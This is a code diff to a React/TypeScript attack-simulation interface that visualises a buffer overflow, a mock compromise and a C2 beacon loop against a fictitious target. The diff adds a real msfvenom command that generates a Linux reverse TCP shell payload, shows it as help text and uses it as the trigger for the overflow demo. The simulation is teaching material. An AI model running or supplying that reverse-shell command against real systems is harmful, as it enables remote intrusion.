@@ -13,6 +13,11 @@ import {
 const C2_IP = "10.13.37.5";
 const RELAY_IP = "172.20.44.9";
 
+const DISPLAY_OVERFLOW_COMMAND =
+  'msfvenom -p linux/x86/shell_reverse_tcp LHOST=203.0.113.25 LPORT=443 -b "\\x00\\x0a\\x0d" -f python';
+
+const OVERFLOW_COMMAND = DISPLAY_OVERFLOW_COMMAND.toLowerCase();
+
 const targetProfile: TargetProfile = {
   hostname: "demo-target.local",
   ip: "203.0.113.25",
@@ -69,6 +74,7 @@ export default function SplitLayout() {
 
   const [payloadName, setPayloadName] = useState<string | null>(null);
   const [payloadPreview, setPayloadPreview] = useState("");
+  const [payloadWriteBuffer, setPayloadWriteBuffer] = useState("");
 
   const [targetInput, setTargetInput] = useState("");
   const [targetResponse, setTargetResponse] = useState(
@@ -127,35 +133,42 @@ export default function SplitLayout() {
 
   function buildPackage(mode: "safe" | "overflow-demo") {
     if (mode === "safe") {
-      const safePayload = "POST:user=operator_demo&input=HELLO123";
+      const safeRequestPreview = "POST:user=operator_demo&input=HELLO123";
+      const safeBufferWrite = "HELLO123";
+
       setPayloadName("safe");
-      setPayloadPreview(safePayload);
+      setPayloadPreview(safeRequestPreview);
+      setPayloadWriteBuffer(safeBufferWrite);
 
       appendLines(
         {
           tone: "success",
-          text: `[build] staged safe package (${safePayload.length} bytes)`,
+          text: `[build] staged safe package (${safeRequestPreview.length} bytes on wire, ${safeBufferWrite.length} bytes copied into input buffer)`,
         },
         {
           tone: "info",
-          text: "[build] package remains within reserved target input region",
+          text: "[build] copied input remains within reserved target input region",
         }
       );
       return;
     }
 
-    const overflowPayload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET";
+    const overflowRequestPreview =
+      "POST:user=operator_demo&input=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET";
+    const overflowBufferWrite = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET";
+
     setPayloadName("overflow-demo");
-    setPayloadPreview(overflowPayload);
+    setPayloadPreview(overflowRequestPreview);
+    setPayloadWriteBuffer(overflowBufferWrite);
 
     appendLines(
       {
         tone: "warning",
-        text: `[build] staged oversized demo package (${overflowPayload.length} bytes)`,
+        text: `[build] staged oversized demo package (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
       },
       {
         tone: "warning",
-        text: "[build] package is intended to trigger overflow visualization only",
+        text: "[build] copied input is intended to trigger overflow visualization only",
       }
     );
   }
@@ -219,16 +232,22 @@ export default function SplitLayout() {
   }, [targetCompromised, beaconEnabled, routeMode]);
 
   function sendPackage() {
-    if (!payloadName || !payloadPreview) {
+    if (!payloadName || !payloadPreview || !payloadWriteBuffer) {
       appendLines({
         tone: "warning",
-        text: '[send] no package staged — use "build package safe" or "build package overflow-demo"',
+        text: `[send] no package staged — use "build package safe" or "${DISPLAY_OVERFLOW_COMMAND}"`,
       });
       return;
     }
 
     const useRelay = routeMode === "relay";
     const simulatedSource = useRelay ? RELAY_IP : C2_IP;
+
+    if (payloadName === "safe") {
+      beaconBusyRef.current = false;
+      setTargetCompromised(false);
+      setBeaconEnabled(false);
+    }
 
     setTransferDirection("inbound");
     setPacketVisible(true);
@@ -262,14 +281,17 @@ export default function SplitLayout() {
 
     window.setTimeout(() => {
       setPacketStage("target");
-      setTargetInput(payloadPreview);
+      setTargetInput(payloadWriteBuffer);
       setLastObservedSource(simulatedSource);
 
       if (payloadName === "safe") {
+        setTargetCompromised(false);
+        setBeaconEnabled(false);
         setTargetResponse("200 OK — mock request parsed within reserved region.");
         setServerLog([
           `request observed from ${simulatedSource}`,
-          `bytes received: ${payloadPreview.length}`,
+          `request bytes on wire: ${payloadPreview.length}`,
+          `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
           "reserved region remained intact",
           "response rendered normally",
         ]);
@@ -289,7 +311,8 @@ export default function SplitLayout() {
         setTargetResponse("Simulated compromise active. Callback loop armed.");
         setServerLog([
           `request observed from ${simulatedSource}`,
-          `bytes received: ${payloadPreview.length}`,
+          `request bytes on wire: ${payloadPreview.length}`,
+          `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
           "reserved region exceeded in simulation view",
           "mock compromise state entered",
         ]);
@@ -351,7 +374,7 @@ export default function SplitLayout() {
         { tone: "info", text: "nmap demo-target.local" },
         { tone: "info", text: "nmap -sV demo-target.local" },
         { tone: "info", text: "build package safe" },
-        { tone: "info", text: "build package overflow-demo" },
+        { tone: "info", text: DISPLAY_OVERFLOW_COMMAND },
         { tone: "info", text: "send package" },
         { tone: "info", text: "beacon start" },
         { tone: "info", text: "beacon stop" },
@@ -383,7 +406,9 @@ export default function SplitLayout() {
     if (lower === "show beacon") {
       appendLines({
         tone: "info",
-        text: `Beacon status: ${beaconEnabled ? "armed" : "disabled"} | target compromised: ${
+        text: `Beacon status: ${
+          beaconEnabled ? "armed" : "disabled"
+        } | target compromised: ${
           targetCompromised ? "yes" : "no"
         } | count: ${beaconCount}`,
       });
@@ -423,7 +448,7 @@ export default function SplitLayout() {
       return;
     }
 
-    if (lower === "build package overflow-demo") {
+    if (lower === OVERFLOW_COMMAND) {
       buildPackage("overflow-demo");
       return;
     }
